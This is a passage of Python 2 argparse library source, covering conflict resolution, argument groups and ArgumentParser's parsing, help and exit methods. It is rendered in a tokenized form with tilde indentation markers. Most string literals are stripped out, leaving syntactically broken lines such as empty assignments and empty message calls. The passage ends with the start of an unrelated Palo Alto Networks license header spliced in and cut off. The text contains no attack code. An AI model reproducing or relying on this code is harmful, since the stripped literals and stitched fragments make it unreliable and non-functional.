~~~ confl_optional = self . _option_string_actions [ option_string ] \n 
confl_optionals . append ( ( option_string , confl_optional ) ) \n 
\n 
# resolve any conflicts \n 
~~ ~~ if confl_optionals : \n 
~~~ conflict_handler = self . _get_handler ( ) \n 
conflict_handler ( action , confl_optionals ) \n 
\n 
~~ ~~ def _handle_conflict_error ( self , action , conflicting_actions ) : \n 
~~~ message = _ ( ) \n 
conflict_string = . join ( [ option_string \n 
for option_string , action \n 
in conflicting_actions ] ) \n 
raise ArgumentError ( action , message % conflict_string ) \n 
\n 
~~ def _handle_conflict_resolve ( self , action , conflicting_actions ) : \n 
\n 
# remove all conflicting options \n 
~~~ for option_string , action in conflicting_actions : \n 
\n 
# remove the conflicting option \n 
~~~ action . option_strings . remove ( option_string ) \n 
self . _option_string_actions . pop ( option_string , None ) \n 
\n 
# if the option now has no option string, remove it from the \n 
# container holding it \n 
if not action . option_strings : \n 
~~~ action . container . _remove_action ( action ) \n 
\n 
\n 
~~ ~~ ~~ ~~ class _ArgumentGroup ( _ActionsContainer ) : \n 
\n 
~~~ def __init__ ( self , container , title = None , description = None , ** kwargs ) : \n 
# add any missing keyword arguments by checking the container \n 
~~~ update = kwargs . setdefault \n 
update ( , container . conflict_handler ) \n 
update ( , container . prefix_chars ) \n 
update ( , container . argument_default ) \n 
super_init = super ( _ArgumentGroup , self ) . __init__ \n 
super_init ( description = description , ** kwargs ) \n 
\n 
# group attributes \n 
self . title = title \n 
self . _group_actions = [ ] \n 
\n 
# share most attributes with the container \n 
self . _registries = container . _registries \n 
self . _actions = container . _actions \n 
self . _option_string_actions = container . _option_string_actions \n 
self . _defaults = container . _defaults \n 
self . _has_negative_number_optionals = container . _has_negative_number_optionals \n 
\n 
~~ def _add_action ( self , action ) : \n 
~~~ action = super ( _ArgumentGroup , self ) . _add_action ( action ) \n 
self . _group_actions . append ( action ) \n 
return action \n 
\n 
~~ def _remove_action ( self , action ) : \n 
~~~ super ( _ArgumentGroup , self ) . _remove_action ( action ) \n 
self . _group_actions . remove ( action ) \n 
\n 
\n 
~~ ~~ class _MutuallyExclusiveGroup ( _ArgumentGroup ) : \n 
\n 
~~~ def __init__ ( self , container , required = False ) : \n 
~~~ super ( _MutuallyExclusiveGroup , self ) . __init__ ( container ) \n 
self . required = required \n 
self . _container = container \n 
\n 
~~ def _add_action ( self , action ) : \n 
~~~ if action . required : \n 
~~~ msg = _ ( ) \n 
raise ValueError ( msg ) \n 
~~ action = self . _container . _add_action ( action ) \n 
self . _group_actions . append ( action ) \n 
return action \n 
\n 
~~ def _remove_action ( self , action ) : \n 
~~~ self . _container . _remove_action ( action ) \n 
self . _group_actions . remove ( action ) \n 
\n 
\n 
~~ ~~ class ArgumentParser ( _AttributeHolder , _ActionsContainer ) : \n 
~~~ """Object for parsing command line strings into Python objects.\n\n    Keyword Arguments:\n        - prog -- The name of the program (default: sys.argv[0])\n        - usage -- A usage message (default: auto-generated from arguments)\n        - description -- A description of what the program does\n        - epilog -- Text following the argument descriptions\n        - parents -- Parsers whose arguments should be copied into this one\n        - formatter_class -- HelpFormatter class for printing help messages\n        - prefix_chars -- Characters that prefix optional arguments\n        - fromfile_prefix_chars -- Characters that prefix files containing\n            additional arguments\n        - argument_default -- The default value for all arguments\n        - conflict_handler -- String indicating how to handle conflicts\n        - add_help -- Add a -h/-help option\n    """ \n 
\n 
def __init__ ( self , \n 
prog = None , \n 
usage = None , \n 
description = None , \n 
epilog = None , \n 
version = None , \n 
parents = [ ] , \n 
formatter_class = HelpFormatter , \n 
prefix_chars = , \n 
fromfile_prefix_chars = None , \n 
argument_default = None , \n 
conflict_handler = , \n 
add_help = True ) : \n 
\n 
~~~ if version is not None : \n 
~~~ import warnings \n 
warnings . warn ( \n 
"""The "version" argument to ArgumentParser is deprecated. """ \n 
"""Please use """ \n 
""""add_argument(..., action=\'version\', version="N", ...)" """ \n 
"""instead""" , DeprecationWarning ) \n 
\n 
~~ superinit = super ( ArgumentParser , self ) . __init__ \n 
superinit ( description = description , \n 
prefix_chars = prefix_chars , \n 
argument_default = argument_default , \n 
conflict_handler = conflict_handler ) \n 
\n 
# default setting for prog \n 
if prog is None : \n 
~~~ prog = _os . path . basename ( _sys . argv [ 0 ] ) \n 
\n 
~~ self . prog = prog \n 
self . usage = usage \n 
self . epilog = epilog \n 
self . version = version \n 
self . formatter_class = formatter_class \n 
self . fromfile_prefix_chars = fromfile_prefix_chars \n 
self . add_help = add_help \n 
\n 
add_group = self . add_argument_group \n 
self . _positionals = add_group ( _ ( ) ) \n 
self . _optionals = add_group ( _ ( ) ) \n 
self . _subparsers = None \n 
\n 
# register types \n 
def identity ( string ) : \n 
~~~ return string \n 
~~ self . register ( , None , identity ) \n 
\n 
# add help and version arguments if necessary \n 
# (using explicit default to override global argument_default) \n 
if in prefix_chars : \n 
~~~ default_prefix = \n 
~~ else : \n 
~~~ default_prefix = prefix_chars [ 0 ] \n 
~~ if self . add_help : \n 
~~~ self . add_argument ( \n 
default_prefix + , default_prefix * 2 + , \n 
action = , default = SUPPRESS , \n 
help = _ ( ) ) \n 
~~ if self . version : \n 
~~~ self . add_argument ( \n 
default_prefix + , default_prefix * 2 + , \n 
action = , default = SUPPRESS , \n 
version = self . version , \n 
help = _ ( "show program\'s version number and exit" ) ) \n 
\n 
# add parent arguments and defaults \n 
~~ for parent in parents : \n 
~~~ self . _add_container_actions ( parent ) \n 
try : \n 
~~~ defaults = parent . _defaults \n 
~~ except AttributeError : \n 
~~~ pass \n 
~~ else : \n 
~~~ self . _defaults . update ( defaults ) \n 
\n 
# ======================= \n 
# Pretty __repr__ methods \n 
# ======================= \n 
~~ ~~ ~~ def _get_kwargs ( self ) : \n 
~~~ names = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
return [ ( name , getattr ( self , name ) ) for name in names ] \n 
\n 
# ================================== \n 
# Optional/Positional adding methods \n 
# ================================== \n 
~~ def add_subparsers ( self , ** kwargs ) : \n 
~~~ if self . _subparsers is not None : \n 
~~~ self . error ( _ ( ) ) \n 
\n 
\n 
~~ kwargs . setdefault ( , type ( self ) ) \n 
\n 
if in kwargs or in kwargs : \n 
~~~ title = _ ( kwargs . pop ( , ) ) \n 
description = _ ( kwargs . pop ( , None ) ) \n 
self . _subparsers = self . add_argument_group ( title , description ) \n 
~~ else : \n 
~~~ self . _subparsers = self . _positionals \n 
\n 
# prog defaults to the usage message of this parser, skipping \n 
# optional arguments and with no "usage:" prefix \n 
~~ if kwargs . get ( ) is None : \n 
~~~ formatter = self . _get_formatter ( ) \n 
positionals = self . _get_positional_actions ( ) \n 
groups = self . _mutually_exclusive_groups \n 
formatter . add_usage ( self . usage , positionals , groups , ) \n 
kwargs [ ] = formatter . format_help ( ) . strip ( ) \n 
\n 
# create the parsers action and add it to the positionals list \n 
~~ parsers_class = self . _pop_action_class ( kwargs , ) \n 
action = parsers_class ( option_strings = [ ] , ** kwargs ) \n 
self . _subparsers . _add_action ( action ) \n 
\n 
# return the created parsers action \n 
return action \n 
\n 
~~ def _add_action ( self , action ) : \n 
~~~ if action . option_strings : \n 
~~~ self . _optionals . _add_action ( action ) \n 
~~ else : \n 
~~~ self . _positionals . _add_action ( action ) \n 
~~ return action \n 
\n 
~~ def _get_optional_actions ( self ) : \n 
~~~ return [ action \n 
for action in self . _actions \n 
if action . option_strings ] \n 
\n 
~~ def _get_positional_actions ( self ) : \n 
~~~ return [ action \n 
for action in self . _actions \n 
if not action . option_strings ] \n 
\n 
# ===================================== \n 
# Command line argument parsing methods \n 
# ===================================== \n 
~~ def parse_args ( self , args = None , namespace = None ) : \n 
~~~ args , argv = self . parse_known_args ( args , namespace ) \n 
if argv : \n 
~~~ msg = _ ( ) \n 
self . error ( msg % . join ( argv ) ) \n 
~~ return args \n 
\n 
~~ def parse_known_args ( self , args = None , namespace = None ) : \n 
# args default to the system args \n 
~~~ if args is None : \n 
~~~ args = _sys . argv [ 1 : ] \n 
\n 
# default Namespace built from parser defaults \n 
~~ if namespace is None : \n 
~~~ namespace = Namespace ( ) \n 
\n 
\n 
~~ for action in self . _actions : \n 
~~~ if action . dest is not SUPPRESS : \n 
~~~ if not hasattr ( namespace , action . dest ) : \n 
~~~ if action . default is not SUPPRESS : \n 
~~~ default = action . default \n 
if isinstance ( action . default , basestring ) : \n 
~~~ default = self . _get_value ( action , default ) \n 
~~ setattr ( namespace , action . dest , default ) \n 
\n 
\n 
~~ ~~ ~~ ~~ for dest in self . _defaults : \n 
~~~ if not hasattr ( namespace , dest ) : \n 
~~~ setattr ( namespace , dest , self . _defaults [ dest ] ) \n 
\n 
# parse the arguments and exit if there are any errors \n 
~~ ~~ try : \n 
~~~ namespace , args = self . _parse_known_args ( args , namespace ) \n 
if hasattr ( namespace , _UNRECOGNIZED_ARGS_ATTR ) : \n 
~~~ args . extend ( getattr ( namespace , _UNRECOGNIZED_ARGS_ATTR ) ) \n 
delattr ( namespace , _UNRECOGNIZED_ARGS_ATTR ) \n 
~~ return namespace , args \n 
~~ except ArgumentError : \n 
~~~ err = _sys . exc_info ( ) [ 1 ] \n 
self . error ( str ( err ) ) \n 
\n 
~~ ~~ def _parse_known_args ( self , arg_strings , namespace ) : \n 
# replace arg strings that are file references \n 
~~~ if self . fromfile_prefix_chars is not None : \n 
~~~ arg_strings = self . _read_args_from_files ( arg_strings ) \n 
\n 
# map all mutually exclusive arguments to the other arguments \n 
\n 
~~ action_conflicts = { } \n 
for mutex_group in self . _mutually_exclusive_groups : \n 
~~~ group_actions = mutex_group . _group_actions \n 
for i , mutex_action in enumerate ( mutex_group . _group_actions ) : \n 
~~~ conflicts = action_conflicts . setdefault ( mutex_action , [ ] ) \n 
conflicts . extend ( group_actions [ : i ] ) \n 
conflicts . extend ( group_actions [ i + 1 : ] ) \n 
\n 
# find all option indices, and determine the arg_string_pattern \n 
\n 
\n 
~~ ~~ option_string_indices = { } \n 
arg_string_pattern_parts = [ ] \n 
arg_strings_iter = iter ( arg_strings ) \n 
for i , arg_string in enumerate ( arg_strings_iter ) : \n 
\n 
# all args after -- are non-options \n 
~~~ if arg_string == : \n 
~~~ arg_string_pattern_parts . append ( ) \n 
for arg_string in arg_strings_iter : \n 
~~~ arg_string_pattern_parts . append ( ) \n 
\n 
# otherwise, add the arg to the arg strings \n 
# and note the index if it was an option \n 
~~ ~~ else : \n 
~~~ option_tuple = self . _parse_optional ( arg_string ) \n 
if option_tuple is None : \n 
~~~ pattern = \n 
~~ else : \n 
~~~ option_string_indices [ i ] = option_tuple \n 
pattern = \n 
~~ arg_string_pattern_parts . append ( pattern ) \n 
\n 
# join the pieces together to form the pattern \n 
~~ ~~ arg_strings_pattern = . join ( arg_string_pattern_parts ) \n 
\n 
# converts arg strings to the appropriate and then takes the action \n 
seen_actions = set ( ) \n 
seen_non_default_actions = set ( ) \n 
\n 
def take_action ( action , argument_strings , option_string = None ) : \n 
~~~ seen_actions . add ( action ) \n 
argument_values = self . _get_values ( action , argument_strings ) \n 
\n 
# error if this argument is not allowed with other previously \n 
# seen arguments, assuming that actions that use the default \n 
# value don\'t really count as "present" \n 
if argument_values is not action . default : \n 
~~~ seen_non_default_actions . add ( action ) \n 
for conflict_action in action_conflicts . get ( action , [ ] ) : \n 
~~~ if conflict_action in seen_non_default_actions : \n 
~~~ msg = _ ( ) \n 
action_name = _get_action_name ( conflict_action ) \n 
raise ArgumentError ( action , msg % action_name ) \n 
\n 
\n 
# (e.g. from a default) \n 
~~ ~~ ~~ if argument_values is not SUPPRESS : \n 
~~~ action ( self , namespace , argument_values , option_string ) \n 
\n 
# function to convert arg_strings into an optional action \n 
~~ ~~ def consume_optional ( start_index ) : \n 
\n 
# get the optional identified at this index \n 
~~~ option_tuple = option_string_indices [ start_index ] \n 
action , option_string , explicit_arg = option_tuple \n 
\n 
# identify additional optionals in the same arg string \n 
# (e.g. -xyz is the same as -x -y -z if no args are required) \n 
match_argument = self . _match_argument \n 
action_tuples = [ ] \n 
while True : \n 
\n 
# if we found no optional action, skip it \n 
~~~ if action is None : \n 
~~~ extras . append ( arg_strings [ start_index ] ) \n 
return start_index + 1 \n 
\n 
# if there is an explicit argument, try to match the \n 
\n 
~~ if explicit_arg is not None : \n 
~~~ arg_count = match_argument ( action , ) \n 
\n 
# if the action is a single-dash option and takes no \n 
# arguments, try to parse more single-dash options out \n 
# of the tail of the option string \n 
chars = self . prefix_chars \n 
if arg_count == 0 and option_string [ 1 ] not in chars : \n 
~~~ action_tuples . append ( ( action , [ ] , option_string ) ) \n 
char = option_string [ 0 ] \n 
option_string = char + explicit_arg [ 0 ] \n 
new_explicit_arg = explicit_arg [ 1 : ] or None \n 
optionals_map = self . _option_string_actions \n 
if option_string in optionals_map : \n 
~~~ action = optionals_map [ option_string ] \n 
explicit_arg = new_explicit_arg \n 
~~ else : \n 
~~~ msg = _ ( ) \n 
raise ArgumentError ( action , msg % explicit_arg ) \n 
\n 
\n 
# successfully matched the option; exit the loop \n 
~~ ~~ elif arg_count == 1 : \n 
~~~ stop = start_index + 1 \n 
args = [ explicit_arg ] \n 
action_tuples . append ( ( action , args , option_string ) ) \n 
break \n 
\n 
# error if a double-dash option did not use the \n 
# explicit argument \n 
~~ else : \n 
~~~ msg = _ ( ) \n 
raise ArgumentError ( action , msg % explicit_arg ) \n 
\n 
# if there is no explicit argument, try to match the \n 
\n 
# if successful, exit the loop \n 
~~ ~~ else : \n 
~~~ start = start_index + 1 \n 
selected_patterns = arg_strings_pattern [ start : ] \n 
arg_count = match_argument ( action , selected_patterns ) \n 
stop = start + arg_count \n 
args = arg_strings [ start : stop ] \n 
action_tuples . append ( ( action , args , option_string ) ) \n 
break \n 
\n 
# add the Optional to the list and return the index at which \n 
\n 
~~ ~~ assert action_tuples \n 
for action , args , option_string in action_tuples : \n 
~~~ take_action ( action , args , option_string ) \n 
~~ return stop \n 
\n 
# the list of Positionals left to be parsed; this is modified \n 
# by consume_positionals() \n 
~~ positionals = self . _get_positional_actions ( ) \n 
\n 
# function to convert arg_strings into positional actions \n 
def consume_positionals ( start_index ) : \n 
# match as many Positionals as possible \n 
~~~ match_partial = self . _match_arguments_partial \n 
selected_pattern = arg_strings_pattern [ start_index : ] \n 
arg_counts = match_partial ( positionals , selected_pattern ) \n 
\n 
# slice off the appropriate arg strings for each Positional \n 
# and add the Positional and its args to the list \n 
for action , arg_count in zip ( positionals , arg_counts ) : \n 
~~~ args = arg_strings [ start_index : start_index + arg_count ] \n 
start_index += arg_count \n 
take_action ( action , args ) \n 
\n 
# slice off the Positionals that we just parsed and return the \n 
\n 
~~ positionals [ : ] = positionals [ len ( arg_counts ) : ] \n 
return start_index \n 
\n 
# consume Positionals and Optionals alternately, until we have \n 
# passed the last option string \n 
~~ extras = [ ] \n 
start_index = 0 \n 
if option_string_indices : \n 
~~~ max_option_string_index = max ( option_string_indices ) \n 
~~ else : \n 
~~~ max_option_string_index = - 1 \n 
~~ while start_index <= max_option_string_index : \n 
\n 
# consume any Positionals preceding the next option \n 
~~~ next_option_string_index = min ( [ \n 
index \n 
for index in option_string_indices \n 
if index >= start_index ] ) \n 
if start_index != next_option_string_index : \n 
~~~ positionals_end_index = consume_positionals ( start_index ) \n 
\n 
\n 
# the option string during the positionals parsing \n 
if positionals_end_index > start_index : \n 
~~~ start_index = positionals_end_index \n 
continue \n 
~~ else : \n 
~~~ start_index = positionals_end_index \n 
\n 
\n 
# at the index of an option string, there were extra arguments \n 
~~ ~~ if start_index not in option_string_indices : \n 
~~~ strings = arg_strings [ start_index : next_option_string_index ] \n 
extras . extend ( strings ) \n 
start_index = next_option_string_index \n 
\n 
# consume the next optional and any arguments for it \n 
~~ start_index = consume_optional ( start_index ) \n 
\n 
# consume any positionals following the last Optional \n 
~~ stop_index = consume_positionals ( start_index ) \n 
\n 
\n 
extras . extend ( arg_strings [ stop_index : ] ) \n 
\n 
\n 
# arg strings supplied. \n 
if positionals : \n 
~~~ self . error ( _ ( ) ) \n 
\n 
# make sure all required actions were present \n 
~~ for action in self . _actions : \n 
~~~ if action . required : \n 
~~~ if action not in seen_actions : \n 
~~~ name = _get_action_name ( action ) \n 
self . error ( _ ( ) % name ) \n 
\n 
# make sure all required groups had one option present \n 
~~ ~~ ~~ for group in self . _mutually_exclusive_groups : \n 
~~~ if group . required : \n 
~~~ for action in group . _group_actions : \n 
~~~ if action in seen_non_default_actions : \n 
~~~ break \n 
\n 
# if no actions were used, report the error \n 
~~ ~~ else : \n 
~~~ names = [ _get_action_name ( action ) \n 
for action in group . _group_actions \n 
if action . help is not SUPPRESS ] \n 
msg = _ ( ) \n 
self . error ( msg % . join ( names ) ) \n 
\n 
# return the updated namespace and the extra arguments \n 
~~ ~~ ~~ return namespace , extras \n 
\n 
~~ def _read_args_from_files ( self , arg_strings ) : \n 
# expand arguments referencing files \n 
~~~ new_arg_strings = [ ] \n 
for arg_string in arg_strings : \n 
\n 
# for regular arguments, just add them back into the list \n 
~~~ if arg_string [ 0 ] not in self . fromfile_prefix_chars : \n 
~~~ new_arg_strings . append ( arg_string ) \n 
\n 
# replace arguments referencing files with the file content \n 
~~ else : \n 
~~~ try : \n 
~~~ args_file = open ( arg_string [ 1 : ] ) \n 
try : \n 
~~~ arg_strings = [ ] \n 
for arg_line in args_file . read ( ) . splitlines ( ) : \n 
~~~ for arg in self . convert_arg_line_to_args ( arg_line ) : \n 
~~~ arg_strings . append ( arg ) \n 
~~ ~~ arg_strings = self . _read_args_from_files ( arg_strings ) \n 
new_arg_strings . extend ( arg_strings ) \n 
~~ finally : \n 
~~~ args_file . close ( ) \n 
~~ ~~ except IOError : \n 
~~~ err = _sys . exc_info ( ) [ 1 ] \n 
self . error ( str ( err ) ) \n 
\n 
# return the modified argument list \n 
~~ ~~ ~~ return new_arg_strings \n 
\n 
~~ def convert_arg_line_to_args ( self , arg_line ) : \n 
~~~ return [ arg_line ] \n 
\n 
~~ def _match_argument ( self , action , arg_strings_pattern ) : \n 
# match the pattern for this action to the arg strings \n 
~~~ nargs_pattern = self . _get_nargs_pattern ( action ) \n 
match = _re . match ( nargs_pattern , arg_strings_pattern ) \n 
\n 
\n 
if match is None : \n 
~~~ nargs_errors = { \n 
None : _ ( ) , \n 
OPTIONAL : _ ( ) , \n 
ONE_OR_MORE : _ ( ) , \n 
} \n 
default = _ ( ) % action . nargs \n 
msg = nargs_errors . get ( action . nargs , default ) \n 
raise ArgumentError ( action , msg ) \n 
\n 
# return the number of arguments matched \n 
~~ return len ( match . group ( 1 ) ) \n 
\n 
~~ def _match_arguments_partial ( self , actions , arg_strings_pattern ) : \n 
# progressively shorten the actions list by slicing off the \n 
# final actions until we find a match \n 
~~~ result = [ ] \n 
for i in range ( len ( actions ) , 0 , - 1 ) : \n 
~~~ actions_slice = actions [ : i ] \n 
pattern = . join ( [ self . _get_nargs_pattern ( action ) \n 
for action in actions_slice ] ) \n 
match = _re . match ( pattern , arg_strings_pattern ) \n 
if match is not None : \n 
~~~ result . extend ( [ len ( string ) for string in match . groups ( ) ] ) \n 
break \n 
\n 
# return the list of arg string counts \n 
~~ ~~ return result \n 
\n 
~~ def _parse_optional ( self , arg_string ) : \n 
\n 
~~~ if not arg_string : \n 
~~~ return None \n 
\n 
\n 
~~ if not arg_string [ 0 ] in self . prefix_chars : \n 
~~~ return None \n 
\n 
# if the option string is present in the parser, return the action \n 
~~ if arg_string in self . _option_string_actions : \n 
~~~ action = self . _option_string_actions [ arg_string ] \n 
return action , arg_string , None \n 
\n 
\n 
~~ if len ( arg_string ) == 1 : \n 
~~~ return None \n 
\n 
# if the option string before the "=" is present, return the action \n 
~~ if in arg_string : \n 
~~~ option_string , explicit_arg = arg_string . split ( , 1 ) \n 
if option_string in self . _option_string_actions : \n 
~~~ action = self . _option_string_actions [ option_string ] \n 
return action , option_string , explicit_arg \n 
\n 
# search through all possible prefixes of the option string \n 
# and all actions in the parser for possible interpretations \n 
~~ ~~ option_tuples = self . _get_option_tuples ( arg_string ) \n 
\n 
# if multiple actions match, the option string was ambiguous \n 
if len ( option_tuples ) > 1 : \n 
~~~ options = . join ( [ option_string \n 
for action , option_string , explicit_arg in option_tuples ] ) \n 
tup = arg_string , options \n 
self . error ( _ ( ) % tup ) \n 
\n 
# if exactly one action matched, this segmentation is good, \n 
# so return the parsed action \n 
~~ elif len ( option_tuples ) == 1 : \n 
~~~ option_tuple , = option_tuples \n 
return option_tuple \n 
\n 
# if it was not found as an option, but it looks like a negative \n 
# number, it was meant to be positional \n 
# unless there are negative-number-like options \n 
~~ if self . _negative_number_matcher . match ( arg_string ) : \n 
~~~ if not self . _has_negative_number_optionals : \n 
~~~ return None \n 
\n 
# if it contains a space, it was meant to be a positional \n 
~~ ~~ if in arg_string : \n 
~~~ return None \n 
\n 
# it was meant to be an optional but there is no such option \n 
# in this parser (though it might be a valid option in a subparser) \n 
~~ return None , arg_string , None \n 
\n 
~~ def _get_option_tuples ( self , option_string ) : \n 
~~~ result = [ ] \n 
\n 
# option strings starting with two prefix characters are only \n 
\n 
chars = self . prefix_chars \n 
if option_string [ 0 ] in chars and option_string [ 1 ] in chars : \n 
~~~ if in option_string : \n 
~~~ option_prefix , explicit_arg = option_string . split ( , 1 ) \n 
~~ else : \n 
~~~ option_prefix = option_string \n 
explicit_arg = None \n 
~~ for option_string in self . _option_string_actions : \n 
~~~ if option_string . startswith ( option_prefix ) : \n 
~~~ action = self . _option_string_actions [ option_string ] \n 
tup = action , option_string , explicit_arg \n 
result . append ( tup ) \n 
\n 
# single character options can be concatenated with their arguments \n 
# but multiple character options always have to have their argument \n 
# separate \n 
~~ ~~ ~~ elif option_string [ 0 ] in chars and option_string [ 1 ] not in chars : \n 
~~~ option_prefix = option_string \n 
explicit_arg = None \n 
short_option_prefix = option_string [ : 2 ] \n 
short_explicit_arg = option_string [ 2 : ] \n 
\n 
for option_string in self . _option_string_actions : \n 
~~~ if option_string == short_option_prefix : \n 
~~~ action = self . _option_string_actions [ option_string ] \n 
tup = action , option_string , short_explicit_arg \n 
result . append ( tup ) \n 
~~ elif option_string . startswith ( option_prefix ) : \n 
~~~ action = self . _option_string_actions [ option_string ] \n 
tup = action , option_string , explicit_arg \n 
result . append ( tup ) \n 
\n 
\n 
~~ ~~ ~~ else : \n 
~~~ self . error ( _ ( ) % option_string ) \n 
\n 
# return the collected option tuples \n 
~~ return result \n 
\n 
~~ def _get_nargs_pattern ( self , action ) : \n 
\n 
\n 
~~~ nargs = action . nargs \n 
\n 
# the default (None) is assumed to be a single argument \n 
if nargs is None : \n 
~~~ nargs_pattern = \n 
\n 
# allow zero or one arguments \n 
~~ elif nargs == OPTIONAL : \n 
~~~ nargs_pattern = \n 
\n 
# allow zero or more arguments \n 
~~ elif nargs == ZERO_OR_MORE : \n 
~~~ nargs_pattern = \n 
\n 
# allow one or more arguments \n 
~~ elif nargs == ONE_OR_MORE : \n 
~~~ nargs_pattern = \n 
\n 
# allow any number of options or arguments \n 
~~ elif nargs == REMAINDER : \n 
~~~ nargs_pattern = \n 
\n 
# allow one argument followed by any number of options or arguments \n 
~~ elif nargs == PARSER : \n 
~~~ nargs_pattern = \n 
\n 
# all others should be integers \n 
~~ else : \n 
~~~ nargs_pattern = % . join ( * nargs ) \n 
\n 
# if this is an optional action, -- is not allowed \n 
~~ if action . option_strings : \n 
~~~ nargs_pattern = nargs_pattern . replace ( , ) \n 
nargs_pattern = nargs_pattern . replace ( , ) \n 
\n 
# return the pattern \n 
~~ return nargs_pattern \n 
\n 
# ======================== \n 
# Value conversion methods \n 
# ======================== \n 
~~ def _get_values ( self , action , arg_strings ) : \n 
\n 
~~~ if action . nargs not in [ PARSER , REMAINDER ] : \n 
~~~ arg_strings = [ s for s in arg_strings if s != ] \n 
\n 
# optional argument produces a default when not present \n 
~~ if not arg_strings and action . nargs == OPTIONAL : \n 
~~~ if action . option_strings : \n 
~~~ value = action . const \n 
~~ else : \n 
~~~ value = action . default \n 
~~ if isinstance ( value , basestring ) : \n 
~~~ value = self . _get_value ( action , value ) \n 
self . _check_value ( action , value ) \n 
\n 
\n 
# args, use the default if it is anything other than None \n 
~~ ~~ elif ( not arg_strings and action . nargs == ZERO_OR_MORE and \n 
not action . option_strings ) : \n 
~~~ if action . default is not None : \n 
~~~ value = action . default \n 
~~ else : \n 
~~~ value = arg_strings \n 
~~ self . _check_value ( action , value ) \n 
\n 
# single argument or optional argument produces a single value \n 
~~ elif len ( arg_strings ) == 1 and action . nargs in [ None , OPTIONAL ] : \n 
~~~ arg_string , = arg_strings \n 
value = self . _get_value ( action , arg_string ) \n 
self . _check_value ( action , value ) \n 
\n 
# REMAINDER arguments convert all values, checking none \n 
~~ elif action . nargs == REMAINDER : \n 
~~~ value = [ self . _get_value ( action , v ) for v in arg_strings ] \n 
\n 
# PARSER arguments convert all values, but check only the first \n 
~~ elif action . nargs == PARSER : \n 
~~~ value = [ self . _get_value ( action , v ) for v in arg_strings ] \n 
self . _check_value ( action , value [ 0 ] ) \n 
\n 
# all other types of nargs produce a list \n 
~~ else : \n 
~~~ value = [ self . _get_value ( action , v ) for v in arg_strings ] \n 
for v in value : \n 
~~~ self . _check_value ( action , v ) \n 
\n 
# return the converted value \n 
~~ ~~ return value \n 
\n 
~~ def _get_value ( self , action , arg_string ) : \n 
~~~ type_func = self . _registry_get ( , action . type , action . type ) \n 
if not _callable ( type_func ) : \n 
~~~ msg = _ ( ) \n 
raise ArgumentError ( action , msg % type_func ) \n 
\n 
# convert the value to the appropriate type \n 
~~ try : \n 
~~~ result = type_func ( arg_string ) \n 
\n 
# ArgumentTypeErrors indicate errors \n 
~~ except ArgumentTypeError : \n 
~~~ name = getattr ( action . type , , repr ( action . type ) ) \n 
msg = str ( _sys . exc_info ( ) [ 1 ] ) \n 
raise ArgumentError ( action , msg ) \n 
\n 
# TypeErrors or ValueErrors also indicate errors \n 
~~ except ( TypeError , ValueError ) : \n 
~~~ name = getattr ( action . type , , repr ( action . type ) ) \n 
msg = _ ( ) \n 
raise ArgumentError ( action , msg % ( name , arg_string ) ) \n 
\n 
# return the converted value \n 
~~ return result \n 
\n 
~~ def _check_value ( self , action , value ) : \n 
# converted value must be one of the choices (if specified) \n 
~~~ if action . choices is not None and value not in action . choices : \n 
~~~ tup = value , . join ( map ( repr , action . choices ) ) \n 
msg = _ ( ) % tup \n 
raise ArgumentError ( action , msg ) \n 
\n 
# ======================= \n 
# Help-formatting methods \n 
# ======================= \n 
~~ ~~ def format_usage ( self ) : \n 
~~~ formatter = self . _get_formatter ( ) \n 
formatter . add_usage ( self . usage , self . _actions , \n 
self . _mutually_exclusive_groups ) \n 
return formatter . format_help ( ) \n 
\n 
~~ def format_help ( self ) : \n 
~~~ formatter = self . _get_formatter ( ) \n 
\n 
# usage \n 
formatter . add_usage ( self . usage , self . _actions , \n 
self . _mutually_exclusive_groups ) \n 
\n 
# description \n 
formatter . add_text ( self . description ) \n 
\n 
# positionals, optionals and user-defined groups \n 
for action_group in self . _action_groups : \n 
~~~ formatter . start_section ( action_group . title ) \n 
formatter . add_text ( action_group . description ) \n 
formatter . add_arguments ( action_group . _group_actions ) \n 
formatter . end_section ( ) \n 
\n 
# epilog \n 
~~ formatter . add_text ( self . epilog ) \n 
\n 
# determine help from format above \n 
return formatter . format_help ( ) \n 
\n 
~~ def format_version ( self ) : \n 
~~~ import warnings \n 
warnings . warn ( \n 
\'The format_version method is deprecated -- the "version" \' \n 
, \n 
DeprecationWarning ) \n 
formatter = self . _get_formatter ( ) \n 
formatter . add_text ( self . version ) \n 
return formatter . format_help ( ) \n 
\n 
~~ def _get_formatter ( self ) : \n 
~~~ return self . formatter_class ( prog = self . prog ) \n 
\n 
# ===================== \n 
# Help-printing methods \n 
# ===================== \n 
~~ def print_usage ( self , file = None ) : \n 
~~~ if file is None : \n 
~~~ file = _sys . stdout \n 
~~ self . _print_message ( self . format_usage ( ) , file ) \n 
\n 
~~ def print_help ( self , file = None ) : \n 
~~~ if file is None : \n 
~~~ file = _sys . stdout \n 
~~ self . _print_message ( self . format_help ( ) , file ) \n 
\n 
~~ def print_version ( self , file = None ) : \n 
~~~ import warnings \n 
warnings . warn ( \n 
\'The print_version method is deprecated -- the "version" \' \n 
, \n 
DeprecationWarning ) \n 
self . _print_message ( self . format_version ( ) , file ) \n 
\n 
~~ def _print_message ( self , message , file = None ) : \n 
~~~ if message : \n 
~~~ if file is None : \n 
~~~ file = _sys . stderr \n 
~~ file . write ( message ) \n 
\n 
# =============== \n 
# Exiting methods \n 
# =============== \n 
~~ ~~ def exit ( self , status = 0 , message = None ) : \n 
~~~ if message : \n 
~~~ self . _print_message ( message , _sys . stderr ) \n 
~~ _sys . exit ( status ) \n 
\n 
~~ def error ( self , message ) : \n 
~~~ """error(message: string)\n\n        Prints a usage message incorporating the message to stderr and\n        exits.\n\n        If you override this in a subclass, it should not return -- it\n        should either exit or raise an exception.\n        """ \n 
self . print_usage ( _sys . stderr ) \n 
self . exit ( 2 , _ ( ) % ( self . prog , message ) ) \n 
#!/usr/bin/env python \n 
\n 
# Copyright (c) 2015, Palo Alto Networks \n 
# \n 
# Permission to use, copy, modify, and/or distribute this software for any \n 
# purpose with or without fee is hereby granted, provided that the above \n 
# copyright notice and this permission notice appear in all copies. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES \n 
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF \n 
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR \n 
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES \n 
